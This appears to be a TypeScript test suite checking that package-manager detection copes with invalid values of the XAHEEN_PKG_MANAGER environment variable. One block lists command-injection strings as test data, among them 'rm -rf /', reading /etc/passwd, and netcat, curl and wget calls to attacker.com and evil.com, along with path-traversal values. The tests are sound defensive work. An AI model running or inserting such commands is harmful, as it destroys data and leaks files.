/**
 * Invalid Package Manager Environment Variable Tests
 * Tests handling of invalid XAHEEN_PKG_MANAGER values
 */

import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { join } from 'path';
import { mkdir, rm, writeFile } from 'fs/promises';
import { existsSync } from 'fs';
import {
  detectPackageManagers,
  detectPackageManagerFromLockfile,
  createLockfile,
  installDependencies,
  isPackageManagerAvailable,
} from '../utils/package-manager-utils';
import { generateTestDir, PACKAGE_MANAGERS } from '../config/test-config';

describe('Invalid Package Manager Environment Variable Tests', () => {
  let testDir: string;
  let originalEnv: string | undefined;
  
  beforeEach(async () => {
    testDir = generateTestDir('invalid-manager-tests');
    await mkdir(testDir, { recursive: true });
    originalEnv = process.env.XAHEEN_PKG_MANAGER;
  });
  
  afterEach(async () => {
    // Restore original environment variable
    if (originalEnv !== undefined) {
      process.env.XAHEEN_PKG_MANAGER = originalEnv;
    } else {
      delete process.env.XAHEEN_PKG_MANAGER;
    }
    
    if (existsSync(testDir)) {
      await rm(testDir, { recursive: true, force: true });
    }
  });

  describe('Completely Invalid Manager Names', () => {
    it('should handle nonsensical package manager names', async () => {
      const invalidNames = [
        'definitely-not-a-package-manager',
        'fake-pm-2023',
        'super-duper-installer',
        'magic-dependency-tool',
        'ultra-fast-pm',
        'quantum-package-manager',
      ];
      
      for (const invalidName of invalidNames) {
        process.env.XAHEEN_PKG_MANAGER = invalidName;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(invalidName);
        
        // System should not crash
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        
        // Should still detect actual available package managers
        expect(detection.available).toContain('npm');
      }
    });

    it('should handle typos in package manager names', async () => {
      const typos = [
        { invalid: 'nmpm', intended: 'npm' },
        { invalid: 'nppm', intended: 'npm' },
        { invalid: 'mpm', intended: 'npm' },
        { invalid: 'yarrn', intended: 'yarn' },
        { invalid: 'yarm', intended: 'yarn' },
        { invalid: 'yarn1', intended: 'yarn' },
        { invalid: 'pmnpm', intended: 'pnpm' },
        { invalid: 'pnpm2', intended: 'pnpm' },
        { invalid: 'pmpn', intended: 'pnpm' },
        { invalid: 'bnn', intended: 'bun' },
        { invalid: 'bunn', intended: 'bun' },
        { invalid: 'bun1', intended: 'bun' },
      ];
      
      for (const typo of typos) {
        process.env.XAHEEN_PKG_MANAGER = typo.invalid;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(typo.invalid);
        
        // Should not match any valid package manager
        const validManagers = PACKAGE_MANAGERS.map(pm => pm.name);
        expect(validManagers).not.toContain(typo.invalid);
        
        // System should handle gracefully
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
      }
    });

    it('should handle old or deprecated package manager names', async () => {
      const deprecatedNames = [
        'bower',
        'jspm',
        'jam',
        'component',
        'ender',
        'volo',
        'npm-legacy',
        'yarn-legacy',
        'yarn-classic',
        'pnpm-old',
      ];
      
      for (const deprecatedName of deprecatedNames) {
        process.env.XAHEEN_PKG_MANAGER = deprecatedName;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(deprecatedName);
        
        // Should not match current package managers
        const validManagers = PACKAGE_MANAGERS.map(pm => pm.name);
        expect(validManagers).not.toContain(deprecatedName);
        
        // System should still function
        const detection = await detectPackageManagers();
        expect(detection.available.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Malicious or Security-Related Values', () => {
    it('should handle path traversal attempts', async () => {
      const maliciousValues = [
        '../npm',
        '../../yarn',
        '/usr/bin/npm',
        'C:\\Program Files\\npm\\npm.exe',
        './node_modules/.bin/npm',
        '~/bin/npm',
        '$HOME/npm',
        '$(which npm)',
        '`which npm`',
      ];
      
      for (const maliciousValue of maliciousValues) {
        process.env.XAHEEN_PKG_MANAGER = maliciousValue;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(maliciousValue);
        
        // Should not execute or interpret as a path
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        
        // Should still detect legitimate package managers
        expect(detection.available.length).toBeGreaterThan(0);
      }
    });

    it('should handle command injection attempts', async () => {
      const injectionAttempts = [
        'npm; rm -rf /',
        'yarn && cat /etc/passwd',
        'pnpm | nc attacker.com 80',
        'bun > /dev/null & curl evil.com',
        'npm; echo "pwned"',
        'yarn || wget evil.com/script.sh',
        'pnpm; sleep 10',
        'bun & background-task',
      ];
      
      for (const injectionAttempt of injectionAttempts) {
        process.env.XAHEEN_PKG_MANAGER = injectionAttempt;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(injectionAttempt);
        
        // Should not execute any commands
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        
        // Should not crash or hang
        expect(detection.available.length).toBeGreaterThan(0);
      }
    });

    it('should handle escape sequence attempts', async () => {
      const escapeSequences = [
        'npm\\x00',
        'yarn\\n\\r',
        'pnpm\\t\\b',
        'bun\\v\\f',
        'npm\x00\x01\x02',
        'yarn\n\r\t',
        'pnpm\u0000\u0001',
        'bun\\\\\\//',
      ];
      
      for (const escapeSequence of escapeSequences) {
        process.env.XAHEEN_PKG_MANAGER = escapeSequence;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(escapeSequence);
        
        // Should handle control characters gracefully
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
      }
    });
  });

  describe('Edge Case Values', () => {
    it('should handle extremely long values', async () => {
      const longValues = [
        'a'.repeat(1000),
        'npm' + 'x'.repeat(500),
        'very-long-package-manager-name-that-exceeds-normal-limits-' + 'x'.repeat(200),
        'npm-' + '1'.repeat(100),
      ];
      
      for (const longValue of longValues) {
        process.env.XAHEEN_PKG_MANAGER = longValue;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(longValue);
        
        // Should handle long values without issues
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        
        // Should not affect system performance significantly
        const startTime = Date.now();
        await detectPackageManagers();
        const duration = Date.now() - startTime;
        expect(duration).toBeLessThan(10000); // Should complete within 10 seconds
      }
    });

    it('should handle unicode and international characters', async () => {
      const unicodeValues = [
        'npm🚀',
        'yarn-ñoño',
        'pnpm-α-β-γ',
        'bun-мой-пакет',
        'パッケージマネージャー',
        'пакетный-менеджер',
        'مدير-الحزم',
        'קבוצת-ניהול',
        'npm-中文版',
        'yarn-العربية',
      ];
      
      for (const unicodeValue of unicodeValues) {
        process.env.XAHEEN_PKG_MANAGER = unicodeValue;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(unicodeValue);
        
        // Should handle unicode characters
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
      }
    });

    it('should handle numeric and mixed values', async () => {
      const numericValues = [
        '123',
        '0',
        '-1',
        '999999',
        '1.0.0',
        'npm123',
        '123yarn',
        'p2npm',
        'bu7n',
        'v8-npm',
        'node16-yarn',
      ];
      
      for (const numericValue of numericValues) {
        process.env.XAHEEN_PKG_MANAGER = numericValue;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(numericValue);
        
        // Should handle numeric values
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        
        // Should not match valid package managers
        const validManagers = PACKAGE_MANAGERS.map(pm => pm.name);
        expect(validManagers).not.toContain(numericValue);
      }
    });
  });

  describe('Fallback Behavior with Invalid Values', () => {
    it('should fall back to lockfile detection when environment variable is invalid', async () => {
      // Create yarn lockfile
      await createLockfile('yarn', testDir, true);
      
      // Set invalid environment variable
      process.env.XAHEEN_PKG_MANAGER = 'invalid-manager-name';
      
      // Lockfile detection should still work
      const lockfileDetection = detectPackageManagerFromLockfile(testDir);
      expect(lockfileDetection).toBe('yarn');
      
      // Environment variable is set but invalid
      expect(process.env.XAHEEN_PKG_MANAGER).toBe('invalid-manager-name');
      
      // System detection should still work
      const systemDetection = await detectPackageManagers();
      expect(systemDetection.available).toContain('npm');
    });

    it('should fall back to system detection when everything else fails', async () => {
      // No lockfile
      // Invalid environment variable
      process.env.XAHEEN_PKG_MANAGER = 'completely-fake-pm';
      
      const lockfileDetection = detectPackageManagerFromLockfile(testDir);
      expect(lockfileDetection).toBeNull();
      
      // System detection should still provide available managers
      const systemDetection = await detectPackageManagers();
      expect(systemDetection.available.length).toBeGreaterThan(0);
      expect(systemDetection.available).toContain('npm');
    });

    it('should handle installation with invalid environment variable', async () => {
      const npmAvailable = await isPackageManagerAvailable('npm');
      if (!npmAvailable) return;
      
      process.env.XAHEEN_PKG_MANAGER = 'fake-package-manager';
      
      const packageJson = {
        name: 'invalid-env-test',
        version: '1.0.0',
        dependencies: {
          'is-even': '^1.0.0',
        },
      };
      
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      // Should fall back to available manager (npm)
      const result = await installDependencies('npm', testDir, 25000);
      expect(result.exitCode).toBe(0);
      
      expect(existsSync(join(testDir, 'node_modules'))).toBe(true);
      expect(existsSync(join(testDir, 'package-lock.json'))).toBe(true);
    }, 35000);
  });

  describe('Error Messages and User Feedback', () => {
    it('should validate environment variable values', async () => {
      const invalidValues = [
        'not-a-pm',
        'npmm',
        'fake-manager',
        '123',
        '',
        '   ',
      ];
      
      const validManagers = PACKAGE_MANAGERS.map(pm => pm.name);
      
      for (const invalidValue of invalidValues) {
        process.env.XAHEEN_PKG_MANAGER = invalidValue;
        
        // Environment variable is set
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(invalidValue);
        
        // But it's not a valid package manager
        const isValid = validManagers.includes(invalidValue.trim().toLowerCase());
        expect(isValid).toBe(false);
        
        // System should still function
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
      }
    });

    it('should provide helpful validation for near-matches', async () => {
      const nearMisses = [
        { invalid: 'npmm', closest: 'npm' },
        { invalid: 'yarrn', closest: 'yarn' },
        { invalid: 'pnpmmm', closest: 'pnpm' },
        { invalid: 'bunn', closest: 'bun' },
        { invalid: 'NPM', closest: 'npm' },
        { invalid: 'YARN', closest: 'yarn' },
      ];
      
      for (const nearMiss of nearMisses) {
        process.env.XAHEEN_PKG_MANAGER = nearMiss.invalid;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(nearMiss.invalid);
        
        // In a real implementation, this would suggest the closest match
        const validManagers = PACKAGE_MANAGERS.map(pm => pm.name);
        expect(validManagers).toContain(nearMiss.closest);
        expect(validManagers).not.toContain(nearMiss.invalid);
      }
    });

    it('should handle repeated invalid values consistently', async () => {
      const invalidValue = 'consistently-invalid-manager';
      
      // Set invalid value multiple times
      for (let i = 0; i < 5; i++) {
        process.env.XAHEEN_PKG_MANAGER = invalidValue;
        
        expect(process.env.XAHEEN_PKG_MANAGER).toBe(invalidValue);
        
        // Should behave consistently each time
        const detection = await detectPackageManagers();
        expect(Array.isArray(detection.available)).toBe(true);
        expect(detection.available.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Performance with Invalid Values', () => {
    it('should not degrade performance with invalid values', async () => {
      const invalidValue = 'performance-test-invalid-manager';
      process.env.XAHEEN_PKG_MANAGER = invalidValue;
      
      const iterations = 10;
      const times: number[] = [];
      
      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now();
        await detectPackageManagers();
        const duration = Date.now() - startTime;
        times.push(duration);
      }
      
      const averageTime = times.reduce((sum, time) => sum + time, 0) / times.length;
      const maxTime = Math.max(...times);
      
      // Should complete reasonably quickly
      expect(averageTime).toBeLessThan(5000); // 5 seconds average
      expect(maxTime).toBeLessThan(10000); // 10 seconds max
      
      console.log(`Invalid value performance: avg=${averageTime}ms, max=${maxTime}ms`);
    });

    it('should not leak memory with invalid values', async () => {
      const invalidValues = Array.from({ length: 100 }, (_, i) => `invalid-manager-${i}`);
      
      for (const invalidValue of invalidValues) {
        process.env.XAHEEN_PKG_MANAGER = invalidValue;
        
        // This should not accumulate memory
        await detectPackageManagers();
        
        // Force garbage collection if available
        if (global.gc) {
          global.gc();
        }
      }
      
      // Test completed without memory issues
      expect(true).toBe(true);
    });
  });
});